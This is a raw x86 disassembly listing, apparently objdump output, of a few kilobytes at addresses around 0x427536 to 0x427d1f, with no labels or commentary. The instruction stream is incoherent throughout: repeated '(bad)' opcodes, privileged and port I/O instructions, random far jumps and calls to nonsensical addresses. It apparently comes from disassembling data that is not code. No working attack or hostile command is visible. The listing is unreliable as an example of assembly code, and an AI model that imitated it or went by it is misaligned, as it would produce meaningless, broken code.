  427536:	push   eax
  427537:	imul   ebx,DWORD PTR cs:[ebx-0x723d0f02],0xbe80fdd3
  427542:	sub    eax,0xfae32c95
  427547:	repz xchg ebp,eax
  427549:	dec    ecx
  42754a:	mov    cl,0x6d
  42754c:	int3   
  42754d:	cli    
  42754e:	add    DWORD PTR [esp+eax*2-0x18f9ff1e],eax
  427555:	dec    esi
  427556:	push   edi
  427557:	and    ecx,ebp
  427559:	mov    bh,0x8e
  42755b:	fistp  DWORD PTR [esi-0x7b]
  42755e:	int3   
  42755f:	xor    al,0xf8
  427561:	mov    ebp,0xf8d6c62c
  427566:	(bad)  
  427567:	aad    0x4e
  427569:	(bad)  
  42756a:	outs   dx,DWORD PTR ds:[esi]
  42756b:	jnp    0x427514
  42756d:	sahf   
  42756e:	adc    bh,BYTE PTR [esi]
  427570:	dec    edx
  427571:	cwde   
  427572:	xor    DWORD PTR [eax+esi*4+0x6e35eaf8],ebp
  427579:	jmp    0x427568
  42757b:	sahf   
  42757c:	adc    dh,bh
  42757e:	fistp  DWORD PTR [ecx-0x62270d6]
  427584:	xchg   edi,eax
  427585:	dec    ebp
  427586:	push   edx
  427587:	aaa    
  427588:	xor    edx,DWORD PTR [edx+0x21]
  42758b:	and    eax,0x4e7915d6
  427590:	bound  eax,QWORD PTR [edi]
  427592:	pop    ebp
  427593:	pusha  
  427594:	inc    esi
  427595:	push   eax
  427596:	rcl    ebx,0x8f
  427599:	mov    ah,0x0
  42759b:	gs push ds
  42759d:	imul   DWORD PTR [ecx+0x19e756d5]
  4275a3:	jno    0x427549
  4275a5:	loopne 0x42754b
  4275a7:	ds cmp ah,al
  4275aa:	xchg   ebx,eax
  4275ab:	jbe    0x427566
  4275ad:	pushf  
  4275ae:	adc    al,0xbf
  4275b0:	jns    0x4275f8
  4275b2:	fdivp  st(3),st
  4275b4:	rcr    ch,1
  4275b6:	int3   
  4275b7:	xchg   BYTE PTR ds:0xebf8ffc2,ch
  4275bd:	inc    edi
  4275be:	fiadd  DWORD PTR [eax+0xf]
  4275c1:	dec    esi
  4275c2:	lea    esi,[esi]
  4275c4:	sbb    DWORD PTR [ebx+0x1d],esi
  4275c7:	cwde   
  4275c8:	sub    eax,esp
  4275ca:	pop    es
  4275cb:	ins    DWORD PTR es:[edi],dx
  4275cc:	sbb    esp,ecx
  4275ce:	pushf  
  4275cf:	jp     0x42763e
  4275d1:	and    DWORD PTR [edi+0x63210d03],esi
  4275d7:	sar    DWORD PTR [edx+esi*2+0x15ca361b],cl
  4275de:	jno    0x427594
  4275e0:	sbb    al,0xd6
  4275e2:	jbe    0x427649
  4275e4:	ja     0x4275d7
  4275e6:	lods   al,BYTE PTR ds:[esi]
  4275e7:	mov    ds:0xe40382dd,eax
  4275ec:	cmc    
  4275ed:	mov    ebp,0xaced3158
  4275f2:	pop    ss
  4275f3:	sbb    ax,0xfce4
  4275f7:	cmp    edx,edi
  4275f9:	add    BYTE PTR [esi],ah
  4275fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4275fc:	mov    al,0xe5
  4275fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4275ff:	sbb    edx,edi
  427601:	push   ss
  427602:	les    esi,FWORD PTR [ebp+0x42]
  427605:	mov    bl,0xc4
  427607:	es fst st(5)
  42760a:	es retf 0x57eb
  42760e:	lods   al,BYTE PTR ds:[esi]
  42760f:	js     0x4275a1
  427611:	int    0xad
  427613:	ret    
  427614:	sub    DWORD PTR ds:0xb0b6e507,esp
  42761a:	shl    DWORD PTR [ebx+0x2b320f51],0x94
  427621:	sbb    edi,DWORD PTR [esi-0x4de61344]
  427627:	mov    WORD PTR [ebp+0x54a67025],?
  42762d:	dec    eax
  42762e:	and    ebp,ecx
  427630:	push   0x2bbbc28
  427635:	mov    eax,0xad705c90
  42763a:	rcl    BYTE PTR [ebp-0x1c4d0892],0x5d
  427641:	mov    ch,dh
  427643:	pop    ds
  427644:	xchg   ebx,eax
  427645:	retf   0x21
  427648:	mov    bh,0xac
  42764a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42764b:	inc    edx
  42764c:	into   
  42764d:	call   0xfe65f016
  427652:	retf   
  427653:	lock adc eax,0x4a02b7c
  427659:	imul   esp,ebp,0x48
  42765c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42765e:	(bad)  
  427660:	add    dl,ch
  427662:	fptan  
  427664:	loope  0x42769e
  427666:	mov    eax,ds:0x40ac08fe
  42766b:	repnz fiadd WORD PTR [edx+esi*4+0x39]
  427670:	and    al,0x47
  427672:	les    esp,FWORD PTR [ebp-0x1cad72c9]
  427678:	rcr    bl,cl
  42767a:	sti    
  42767b:	xchg   edi,eax
  42767c:	hlt    
  42767d:	mov    bh,0xc2
  42767f:	int    0x5e
  427681:	jmp    0x73254846
  427686:	or     eax,0x7d6642e5
  42768b:	xor    cl,BYTE PTR [esi]
  42768d:	test   BYTE PTR [eax-0x30],al
  427690:	pushf  
  427691:	repz fst QWORD PTR [esi]
  427694:	out    0x8c,al
  427696:	sub    al,bh
  427698:	test   BYTE PTR [esi+0x72e974ae],dh
  42769e:	inc    ecx
  42769f:	sti    
  4276a0:	or     eax,0x1f5931f9
  4276a6:	xor    al,0x34
  4276a8:	sub    DWORD PTR [edx+0x6c84382d],esi
  4276ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4276af:	xchg   DWORD PTR [ecx+0x3e],edx
  4276b2:	adc    BYTE PTR [ecx],0x1a
  4276b5:	xor    ebp,DWORD PTR [edi]
  4276b7:	stc    
  4276b8:	rcl    DWORD PTR [eax+0x24],cl
  4276bb:	rcl    BYTE PTR [esi],0x61
  4276be:	cmp    DWORD PTR [esi+0x34],ecx
  4276c1:	mov    edx,0x5a7aa8c4
  4276c6:	pop    edi
  4276c7:	xor    cl,BYTE PTR [esp+eax*8-0x13]
  4276cb:	mov    dl,BYTE PTR ds:0x60313ddf
  4276d1:	cdq    
  4276d2:	neg    DWORD PTR [eax-0x9]
  4276d5:	jo     0x4276ec
  4276d7:	je     0x4276f9
  4276d9:	out    0x24,al
  4276db:	cmp    al,0x75
  4276dd:	jle    0x427700
  4276df:	bound  ebp,QWORD PTR gs:[edx-0x4256bec9]
  4276e6:	dec    ecx
  4276e7:	outs   dx,BYTE PTR ds:[esi]
  4276e8:	mov    edi,0x70608c87
  4276ed:	push   ds
  4276ee:	jns    0x4276d2
  4276f0:	retf   0xaad1
  4276f3:	sub    eax,0xc2de82a7
  4276f8:	out    0x5f,eax
  4276fa:	xchg   edi,eax
  4276fb:	sub    ebx,DWORD PTR [esi]
  4276fd:	out    0x98,al
  4276ff:	mov    ecx,0x22d543a1
  427704:	jmp    0x34022f22
  427709:	cmc    
  42770a:	fst    QWORD PTR [ebp-0xb008ae1]
  427710:	mov    ?,WORD PTR [ebx+0x7173559b]
  427716:	nop
  427717:	xor    dh,BYTE PTR [ebx+0xd]
  42771a:	lods   al,BYTE PTR ds:[esi]
  42771b:	fisub  WORD PTR [edx+0x47]
  42771e:	jmp    0xdf4d:0x2b270c87
  427725:	popa   
  427726:	daa    
  427727:	mov    ebx,0x2a3d7294
  42772c:	pop    ebx
  42772d:	jmp    0x4276bf
  42772f:	cmp    al,0x30
  427731:	dec    esp
  427732:	outs   dx,DWORD PTR ds:[esi]
  427733:	sbb    edx,ebp
  427735:	or     DWORD PTR [eax+0x1e],edx
  427738:	jb     0x427759
  42773a:	call   0x58ce7aa6
  42773f:	out    0x4d,al
  427741:	xor    esi,ebx
  427743:	inc    edx
  427744:	data16 or cl,dl
  427747:	fcmovbe st,st(4)
  427749:	out    dx,eax
  42774a:	(bad)  
  42774c:	mov    eax,0x5de494ad
  427751:	push   eax
  427752:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427753:	inc    edx
  427754:	jo     0x427730
  427756:	pop    esp
  427757:	jo     0x42777e
  427759:	stos   BYTE PTR es:[edi],al
  42775a:	in     al,0xf6
  42775c:	fnsave [eax+0x67]
  42775f:	xchg   edi,eax
  427760:	(bad)  [edx]
  427762:	sbb    eax,0xd529a504
  427767:	push   ebx
  427768:	add    al,0xcb
  42776a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42776b:	mov    eax,ds:0x181ca7d4
  427770:	mov    eax,ds:0xdde37c44
  427775:	mov    eax,0x341c0989
  42777a:	jno    0x427714
  42777c:	es push esi
  42777e:	cmp    esp,DWORD PTR [esi+0x43e9949f]
  427784:	popa   
  427785:	push   esp
  427786:	cmp    al,0x92
  427788:	inc    edi
  427789:	lock and DWORD PTR [ebp+0xe],ebx
  42778d:	retf   
  42778e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42778f:	or     DWORD PTR [esi],ebx
  427791:	js     0x427744
  427793:	xchg   ebx,eax
  427794:	inc    BYTE PTR [edx-0x10656e03]
  42779a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42779b:	xchg   ebp,eax
  42779c:	mov    ebp,0xb95bcafd
  4277a1:	(bad)  
  4277a2:	pop    cx
  4277a4:	ffreep st(1)
  4277a6:	xchg   ebx,eax
  4277a7:	push   ecx
  4277a8:	test   BYTE PTR [edx],ch
  4277aa:	pop    eax
  4277ab:	dec    edi
  4277ac:	mov    edx,0x9195cfda
  4277b1:	rcr    BYTE PTR [ebx+0x60],1
	...
  4277c0:	add    BYTE PTR [esp+eax*2],ch
  4277c3:	and    edi,DWORD PTR [eax+0x6b]
  4277c6:	jg     0x427847
  4277c8:	push   esp
  4277c9:	adc    edi,DWORD PTR [ebp-0x6d6a5d8a]
  4277cf:	push   edx
  4277d0:	mov    eax,0x1ed78
  4277d5:	stos   DWORD PTR es:[edi],eax
  4277d6:	add    eax,DWORD PTR [eax]
  4277d8:	add    BYTE PTR [edx+0x22],ch
  4277db:	test   eax,0xc514b7f
  4277e0:	push   0x44
  4277e2:	xor    al,0xe3
  4277e4:	retf   
  4277e5:	jp     0x427772
  4277e7:	fiadd  DWORD PTR [ebx-0x511c9052]
  4277ed:	inc    edi
  4277ee:	sti    
  4277ef:	mov    DWORD PTR [ebp-0x66e9975],edi
  4277f5:	in     al,0x5a
  4277f7:	fiadd  WORD PTR [esi+ebx*8]
  4277fa:	pop    eax
  4277fb:	loopne 0x4277e9
  4277fd:	(bad)  [edi-0x4a]
  427800:	cwde   
  427801:	sbb    eax,0x8a9c6845
  427806:	push   esp
  427807:	inc    eax
  427808:	sbb    esi,DWORD PTR [edi+0x7e]
  42780b:	xor    al,bh
  42780d:	push   es
  42780e:	scas   al,BYTE PTR es:[edi]
  42780f:	aad    0xc4
  427811:	dec    esi
  427812:	popa   
  427813:	push   0xffffffd1
  427815:	inc    esp
  427816:	adc    BYTE PTR [eax+edi*1],bl
  427819:	ret    
  42781a:	bound  edx,QWORD PTR [esi+eax*2]
  42781d:	jl     0x427806
  42781f:	add    al,0x4c
  427821:	out    0x1f,al
  427823:	adc    edx,DWORD PTR [ecx]
  427825:	add    al,0xfa
  427827:	js     0x4277d9
  427829:	test   al,0x86
  42782b:	sub    bl,BYTE PTR [esi]
  42782d:	sahf   
  42782e:	xor    BYTE PTR [ecx],dh
  427830:	lods   eax,DWORD PTR ds:[esi]
  427831:	adc    DWORD PTR [esp+ecx*8+0x5d],esp
  427835:	(bad)  
  427837:	mov    ds:0x4119e198,eax
  42783c:	cmc    
  42783d:	loop   0x427827
  42783f:	pop    DWORD PTR [ecx+ebx*8]
  427842:	gs (bad) 
  427844:	sub    BYTE PTR [edi],bl
  427846:	push   ss
  427847:	mov    DWORD PTR ds:[eax-0x2a],esi
  42784b:	jecxz  0x427804
  42784d:	xchg   edi,eax
  42784e:	out    0x3,eax
  427850:	popa   
  427851:	mov    eax,ds:0x8fd4668d
  427856:	call   0xe3f9fc3c
  42785b:	xchg   edi,ebx
  42785d:	push   ecx
  42785e:	mov    eax,ds:0xcefaee04
  427863:	cmp    edx,esp
  427865:	mov    ds,WORD PTR [esi+ebp*2+0x7e6b2032]
  42786c:	mov    edi,0xaf648687
  427871:	xor    bh,BYTE PTR [edx+eiz*8-0x14ca6153]
  427878:	scas   eax,DWORD PTR es:[edi]
  427879:	in     al,0xb7
  42787b:	ins    BYTE PTR es:[edi],dx
  42787c:	add    DWORD PTR [ebx+0x1cfcc936],ebp
  427882:	cmp    DWORD PTR [ecx],edi
  427884:	idiv   BYTE PTR ds:0x980b908d
  42788a:	dec    DWORD PTR [eax]
  42788c:	fstp   QWORD PTR [ecx]
  42788e:	lea    edi,ds:0x4e5fe850
  427894:	add    BYTE PTR [eax+edi*4],dh
  427897:	fldcw  WORD PTR [esi]
  427899:	adc    DWORD PTR [ebx+edx*1],0xfffffff5
  42789d:	call   0x6aef2aee
  4278a2:	cwde   
  4278a3:	shl    cl,cl
  4278a5:	leave  
  4278a6:	add    eax,DWORD PTR [edx-0x45c359b4]
  4278ac:	push   ss
  4278ad:	or     edx,DWORD PTR [bp+si]
  4278b0:	adc    eax,0x2c99016d
  4278b5:	jl     0x42790e
  4278b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4278b8:	adc    BYTE PTR [eax-0x40],bh
  4278bb:	aam    0x31
  4278bd:	js     0x427861
  4278bf:	fwait
  4278c0:	repz mov cl,0x77
  4278c3:	mov    ebx,0xbff55bdc
  4278c8:	test   eax,0xe51f0090
  4278cd:	sub    eax,0xf3e60b6
  4278d2:	adc    bl,ch
  4278d4:	ss loopne 0x427861
  4278d7:	sbb    BYTE PTR [esi],cl
  4278d9:	pop    eax
  4278da:	sub    al,0xc6
  4278dc:	jns    0x4278b9
  4278de:	dec    esi
  4278df:	rdmsr  
  4278e1:	xchg   ebx,eax
  4278e2:	and    cl,BYTE PTR [esi-0x7c]
  4278e5:	fnstenv [edi]
  4278e7:	repnz and al,0xb6
  4278ea:	repnz xchg ebp,eax
  4278ec:	inc    ecx
  4278ed:	mul    DWORD PTR [edx+0x6e9c5933]
  4278f3:	dec    edx
  4278f4:	inc    ebx
  4278f5:	mov    esp,0xe4ffac7a
  4278fa:	adc    eax,0x80271301
  4278ff:	adc    eax,0xaf310b1d
  427904:	push   edi
  427905:	dec    edi
  427906:	inc    ebp
  427907:	xchg   esi,eax
  427908:	sub    edx,esp
  42790a:	mov    ch,0xab
  42790c:	inc    edi
  42790d:	jmp    0xca37:0x4f44dcaf
  427914:	outs   dx,BYTE PTR ds:[esi]
  427915:	(bad)  
  427916:	sub    al,0x34
  427918:	push   cs
  427919:	jno    0x427955
  42791b:	call   DWORD PTR [esi+0x51]
  42791e:	or     ah,BYTE PTR [eax-0x6]
  427921:	retf   
  427922:	test   eax,0x94911899
  427927:	jg     0x4278b2
  427929:	ja     0x427991
  42792b:	jmp    0x5cdef074
  427930:	out    dx,al
  427931:	sub    DWORD PTR [esi-0x462928ac],edi
  427937:	sub    al,0x84
  427939:	push   esi
  42793a:	jmp    0x75b6:0xf5d804ad
  427941:	pop    ss
  427942:	ins    DWORD PTR es:[edi],dx
  427943:	mov    ch,0x28
  427945:	daa    
  427946:	xchg   esp,eax
  427947:	push   0xefcfb91f
  42794c:	adc    al,0x8c
  42794e:	int3   
  42794f:	inc    edx
  427950:	add    ebx,DWORD PTR [edx+0x4a7b74cd]
  427956:	inc    edi
  427957:	pop    ebp
  427958:	mov    dl,0x2e
  42795a:	mov    al,ds:0x288fc522
  427960:	cvtpi2ps xmm6,QWORD PTR [edx-0x63]
  427964:	jl     0x42795e
  427966:	or     eax,0x719cbfa2
  42796b:	inc    esp
  42796c:	jbe    0x42793a
  42796e:	daa    
  42796f:	push   ecx
  427970:	clc    
  427971:	rcl    DWORD PTR [ebx-0x3b],0x40
  427975:	in     eax,0xab
  427977:	or     DWORD PTR [ebx],0x34d6f02
  42797d:	imul   esp,DWORD PTR [edx+0x33],0x1da1b55f
  427984:	jb     0x427965
  427986:	mov    ebx,0xe0c8e94d
  42798b:	not    DWORD PTR [ecx]
  42798d:	jo     0x427978
  42798f:	shr    cl,1
  427991:	fcomp  st(5)
  427993:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427994:	pop    ecx
  427995:	aad    0x9b
  427997:	add    ah,BYTE PTR [edi]
  427999:	enter  0x8559,0x7a
  42799d:	sbb    edi,ecx
  42799f:	mov    ah,0x0
  4279a1:	cli    
  4279a2:	test   DWORD PTR [eax-0x418fdf5d],esi
  4279a8:	push   ds
  4279a9:	imul   ebx,DWORD PTR [edi],0x9780b170
  4279af:	clc    
  4279b0:	out    dx,al
  4279b1:	sub    eax,0x44614ff9
  4279b6:	and    BYTE PTR [ebx+0x5347069d],0x3e
  4279bd:	aaa    
  4279be:	aam    0x32
  4279c0:	je     0x4279e0
  4279c2:	pop    ebx
  4279c3:	call   0x27212d70
  4279c8:	mov    edi,0x97da8b5a
  4279cd:	jecxz  0x4279e0
  4279cf:	mov    eax,edx
  4279d1:	mov    BYTE PTR [ecx+0x70d8cef1],dh
  4279d7:	clc    
  4279d8:	fidiv  WORD PTR [edx-0x124821f9]
  4279de:	add    al,0x52
  4279e0:	iret   
  4279e1:	pop    ebp
  4279e2:	into   
  4279e3:	push   edi
  4279e4:	enter  0x44cc,0x8c
  4279e8:	or     DWORD PTR [ecx],esp
  4279ea:	mov    dh,0x94
  4279ec:	cmp    BYTE PTR [ebp+eax*8+0x6fd617d7],dl
  4279f3:	mov    eax,ds:0xea2efce4
  4279f8:	sub    cl,dh
  4279fa:	jmp    0x9a3353ef
  4279ff:	and    eax,ebp
  427a01:	xchg   ebx,eax
  427a02:	xor    DWORD PTR [ebp+0xc],edi
  427a05:	adc    eax,0xce237af6
  427a0a:	mov    eax,0xde3a2a
  427a0f:	and    ecx,DWORD PTR [ebp-0x26]
  427a12:	mov    dl,0x95
  427a14:	lods   eax,DWORD PTR ds:[esi]
  427a15:	fstp   DWORD PTR [ebx+ebx*4+0x65a519c6]
  427a1c:	xchg   esp,eax
  427a1d:	xor    BYTE PTR [ebp+ebx*8-0x7dcccff4],0x74
  427a25:	push   eax
  427a26:	fcomip st,st(5)
  427a28:	or     bl,al
  427a2a:	or     BYTE PTR [edx-0x894c20b],cl
  427a30:	retf   
  427a31:	dec    edi
  427a32:	sbb    esi,DWORD PTR [edx+0x21b2ecb]
  427a38:	imul   edi,DWORD PTR ds:0x9ab9aa9b,0xda88d101
  427a42:	aad    0xd
  427a44:	inc    esi
  427a45:	xchg   esp,eax
  427a46:	dec    ecx
  427a47:	repz cld 
  427a49:	sub    esp,DWORD PTR [ecx-0x7f4b81c4]
  427a4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427a50:	pop    ds
  427a51:	jle    0x427aaf
  427a53:	call   0xc1fcf417
  427a58:	pop    ebx
  427a59:	loope  0x427a6e
  427a5b:	gs jnp 0x427a0f
  427a5e:	xchg   ebx,eax
  427a5f:	shr    BYTE PTR [eax],cl
  427a61:	aad    0xe2
  427a63:	data16 xor bl,BYTE PTR [eax+0x5b]
  427a67:	fwait
  427a68:	nop
  427a69:	xchg   edi,eax
  427a6a:	pop    ecx
  427a6b:	out    0x7b,al
  427a6d:	aam    0x7e
  427a6f:	bound  edx,QWORD PTR [eax-0x60e8148c]
  427a75:	out    0x64,eax
  427a77:	dec    edi
  427a78:	push   ebp
  427a79:	add    eax,0xb1ac3ba2
  427a7e:	or     ebx,DWORD PTR [ebp+0x8a50351]
  427a84:	jge    0x427a50
  427a86:	add    al,0x29
  427a88:	add    esi,DWORD PTR [ebp+0x5a9da030]
  427a8e:	sub    DWORD PTR [edx+0x4e],ebp
  427a91:	xchg   esp,eax
  427a92:	sub    BYTE PTR [ebx-0x4d],ah
  427a95:	test   BYTE PTR [edx-0x248f7232],cl
  427a9b:	es sbb dl,ah
  427a9e:	fdivr  QWORD PTR [edx+eax*1+0xd]
  427aa2:	lods   eax,DWORD PTR ds:[esi]
  427aa3:	mov    ch,0x1d
  427aa5:	dec    esi
  427aa6:	and    DWORD PTR [ebx-0x11b858b9],esp
  427aac:	enter  0x9121,0x5e
  427ab0:	push   esp
  427ab1:	sahf   
  427ab2:	mov    edi,0xc650da30
  427ab7:	xchg   esp,eax
  427ab8:	jo     0x427af1
  427aba:	fld    QWORD PTR [esi-0x22703c8b]
  427ac0:	pop    ss
  427ac1:	dec    ecx
  427ac2:	jl     0x427a97
  427ac4:	sub    ebx,DWORD PTR [edi]
  427ac6:	mul    edi
  427ac8:	jle    0x427adb
  427aca:	mov    edx,0x3ae977c0
  427acf:	leave  
  427ad0:	pop    ss
  427ad1:	sub    DWORD PTR [edx-0x7099bb6f],ebx
  427ad7:	push   ebx
  427ad8:	fisttp WORD PTR [edx+0x59]
  427adb:	shl    BYTE PTR [edx],cl
  427add:	pusha  
  427ade:	test   ah,ch
  427ae0:	jecxz  0x427b00
  427ae2:	and    BYTE PTR [edi+ebx*4+0x5],cl
  427ae6:	mov    bh,0x22
  427ae8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427ae9:	pop    eax
  427aea:	pop    edx
  427aeb:	push   edx
  427aec:	inc    edi
  427aed:	add    BYTE PTR [edx+0x4b1c9dc5],al
  427af3:	xchg   esp,eax
  427af4:	jl     0x427b6c
  427af6:	cmp    al,BYTE PTR [edx+0x79]
  427af9:	mov    bh,0x2e
  427afb:	mul    BYTE PTR [edi+0x24c1d07e]
  427b01:	xor    DWORD PTR [esi+0x6f64f506],esi
  427b07:	jl     0x427af8
  427b09:	std    
  427b0a:	seta   bl
  427b0d:	lods   al,BYTE PTR ds:[esi]
  427b0e:	lahf   
  427b0f:	popf   
  427b10:	xor    ebp,DWORD PTR [eax+0x1956ff11]
  427b16:	inc    ecx
  427b17:	lods   eax,DWORD PTR ds:[esi]
  427b18:	dec    eax
  427b19:	jp     0x427b6b
  427b1b:	sbb    ch,BYTE PTR [ecx-0x548c3736]
  427b21:	push   eax
  427b22:	outs   dx,BYTE PTR ds:[esi]
  427b23:	lods   eax,DWORD PTR ds:[esi]
  427b24:	clts   
  427b26:	or     al,0xe2
  427b28:	inc    ecx
  427b29:	push   esp
  427b2a:	jl     0x427b1a
  427b2c:	retf   0xa17e
  427b2f:	icebp  
  427b30:	aad    0x12
  427b32:	push   esp
  427b33:	push   edi
  427b34:	inc    eax
  427b35:	and    esp,DWORD PTR [ecx+0x6ab5c4ae]
  427b3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427b3c:	fistp  WORD PTR [esi+edi*1+0x54ea2ff1]
  427b43:	mov    eax,ds:0x10ee46b8
  427b48:	repz pop ecx
  427b4a:	cmp    DWORD PTR [ebx+0x39],esp
  427b4d:	adc    eax,0xb5370473
  427b52:	jae    0x427b9b
  427b54:	ss and ecx,ecx
  427b57:	in     al,dx
  427b58:	xor    ch,BYTE PTR [ecx+ebx*2+0x12]
  427b5c:	xlat   BYTE PTR ds:[ebx]
  427b5d:	stos   DWORD PTR es:[edi],eax
  427b5e:	add    al,0xf7
  427b60:	and    al,0xc5
  427b62:	(bad)  
  427b63:	jl     0x427b39
  427b65:	ret    0x2c0c
  427b68:	rcr    BYTE PTR [ebp+0x6],1
  427b6b:	sub    DWORD PTR [ebp-0x107e85b5],ecx
  427b71:	sub    DWORD PTR [edi],edi
  427b73:	jns    0x427b01
  427b75:	or     BYTE PTR [esi],bl
  427b77:	in     eax,dx
  427b78:	shr    BYTE PTR [ebp-0x2a],1
  427b7b:	push   0x64
  427b7d:	mov    edi,0xcadccc60
  427b82:	xor    esi,DWORD PTR [ebx]
	...
  427b90:	add    BYTE PTR [ebx],ch
  427b92:	loopne 0x427c0f
  427b94:	cmp    bl,bh
  427b96:	mov    ebx,0x345ef36b
  427b9b:	aaa    
  427b9c:	mov    DWORD PTR [esi],ebx
  427b9e:	das    
  427b9f:	fist   WORD PTR [ebx]
  427ba1:	and    esi,ecx
  427ba3:	add    DWORD PTR [eax],eax
  427ba5:	stos   DWORD PTR es:[edi],eax
  427ba6:	add    eax,DWORD PTR [eax]
  427ba8:	add    BYTE PTR [ecx],al
  427baa:	jns    0x427b99
  427bac:	ret    
  427bad:	jl     0x427bc6
  427baf:	retf   0x1504
  427bb2:	push   edx
  427bb3:	jo     0x427b42
  427bb5:	sbb    BYTE PTR [edx+0x36],dl
  427bb8:	xchg   DWORD PTR [ecx-0x23],edi
  427bbb:	aaa    
  427bbc:	stc    
  427bbd:	test   al,0xe6
  427bbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427bc0:	ins    DWORD PTR es:[edi],dx
  427bc1:	xor    edi,DWORD PTR cs:[eax+0x27]
  427bc5:	mov    ebx,0x6bf0645b
  427bca:	fcmovbe st,st(7)
  427bcc:	fild   QWORD PTR [esi]
  427bce:	ds dec eax
  427bd0:	xchg   ebx,eax
  427bd1:	in     eax,dx
  427bd2:	ret    0x4d12
  427bd5:	push   edx
  427bd6:	jno    0x427ba2
  427bd8:	and    BYTE PTR ds:0x283d08f1,0xd
  427bdf:	push   esp
  427be0:	sub    ebp,DWORD PTR [esi+0x4c2e97df]
  427be6:	mov    dh,0xe0
  427be8:	sbb    dl,ah
  427bea:	mov    ebp,0x86c7b24f
  427bef:	push   ebp
  427bf0:	mov    gs,edi
  427bf2:	and    eax,0xe92b4e13
  427bf7:	ror    ch,0xb9
  427bfa:	cmc    
  427bfb:	xor    al,0xb0
  427bfd:	dec    esi
  427bfe:	leave  
  427bff:	fnstenv [ecx+0x49]
  427c02:	add    ah,BYTE PTR [edx+0x2]
  427c05:	push   esp
  427c06:	mov    esi,DWORD PTR [edi-0x770e682d]
  427c0c:	(bad)  
  427c0e:	pop    eax
  427c0f:	inc    edi
  427c10:	xor    BYTE PTR [eax+0x5a2bb35a],dh
  427c16:	iret   
  427c17:	inc    ebx
  427c18:	int3   
  427c19:	fwait
  427c1a:	sbb    esi,DWORD PTR ds:0xa803dff9
  427c20:	int    0x3b
  427c22:	mov    bh,BYTE PTR [eax-0x71eb8bd0]
  427c28:	pushf  
  427c29:	ret    
  427c2a:	push   edx
  427c2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427c2c:	adc    eax,0xc956806c
  427c31:	cmc    
  427c32:	adc    eax,0x3095e2d1
  427c37:	xor    ecx,DWORD PTR [eax]
  427c39:	cdq    
  427c3a:	push   0x710d6b5a
  427c3f:	mul    BYTE PTR [esi]
  427c41:	push   ss
  427c42:	and    al,0x60
  427c44:	jns    0x427bda
  427c46:	shl    DWORD PTR [edi+edx*1+0x1c],0xaa
  427c4b:	xchg   edi,eax
  427c4c:	fwait
  427c4d:	push   ds
  427c4e:	in     eax,dx
  427c4f:	mov    eax,ds:0x782489b6
  427c54:	dec    ebp
  427c55:	scas   al,BYTE PTR es:[edi]
  427c56:	inc    esi
  427c57:	add    DWORD PTR [ecx],esp
  427c59:	mov    esp,0x9ea58598
  427c5e:	pop    ss
  427c5f:	add    al,0xd7
  427c61:	fistp  WORD PTR [ebx-0x6f78c88d]
  427c67:	shl    BYTE PTR [edx],cl
  427c69:	ins    DWORD PTR es:[edi],dx
  427c6a:	stc    
  427c6b:	cmp    eax,0x2508027c
  427c70:	dec    edx
  427c71:	sub    esi,esi
  427c73:	test   al,0x14
  427c75:	int3   
  427c76:	ret    0xd120
  427c79:	mov    eax,ds:0x44157bb
  427c7e:	stos   DWORD PTR es:[edi],eax
  427c7f:	mov    edi,0x2333072b
  427c84:	xor    al,0x6c
  427c86:	loope  0x427c7d
  427c88:	jns    0x427cf3
  427c8a:	and    BYTE PTR [ebp-0x17],bl
  427c8d:	push   es
  427c8e:	inc    ecx
  427c8f:	popa   
  427c90:	std    
  427c91:	or     eax,0x48c50d8b
  427c96:	sbb    al,0x3f
  427c98:	das    
  427c99:	data16 (bad) 
  427c9b:	dec    ebp
  427c9c:	adc    BYTE PTR [ebp+edx*4+0x2c],dh
  427ca0:	jl     0x427cfd
  427ca2:	loope  0x427cbb
  427ca4:	cli    
  427ca5:	xchg   edx,eax
  427ca6:	fldz   
  427ca8:	mov    ah,dl
  427caa:	or     DWORD PTR [esi+0x4a82240b],edi
  427cb0:	inc    esi
  427cb1:	leave  
  427cb2:	and    bh,0xa5
  427cb5:	add    DWORD PTR [ebp+0x31e43045],eax
  427cbb:	test   al,0x84
  427cbd:	jbe    0x427d10
  427cbf:	int    0x3e
  427cc1:	xor    bh,bh
  427cc3:	loopne 0x427c79
  427cc5:	sbb    al,0x51
  427cc7:	out    dx,eax
  427cc8:	push   edx
  427cc9:	call   0x9cbb2edb
  427cce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427ccf:	pop    esi
  427cd0:	in     al,0xed
  427cd2:	inc    ecx
  427cd3:	ins    BYTE PTR es:[edi],dx
  427cd4:	adc    eax,0x16b4423c
  427cd9:	jmp    0xa4d41eb6
  427cde:	dec    eax
  427cdf:	adc    ah,BYTE PTR [ebp-0x4d]
  427ce2:	mov    dl,0x4b
  427ce4:	push   esi
  427ce5:	std    
  427ce6:	jl     0x427d27
  427ce8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427ce9:	sets   bh
  427cec:	add    eax,0xc9f51666
  427cf1:	fnstenv [ecx-0x18]
  427cf4:	jmp    0x4725:0x2f5aad89
  427cfb:	jb     0x427d19
  427cfd:	test   BYTE PTR [ebx-0x325ae3c6],0xe5
  427d04:	enter  0x4214,0x7b
  427d08:	inc    edi
  427d09:	jg     0x427d80
  427d0b:	pop    edx
  427d0c:	retf   
  427d0d:	sub    DWORD PTR [eax],0x3
  427d10:	push   cs
  427d11:	sbb    DWORD PTR [edx-0x50],0xcc1e12c3
  427d18:	pop    esi
  427d19:	sub    eax,0xca3dd710
  427d1e:	pusha  
  427d1f:	(bad)  
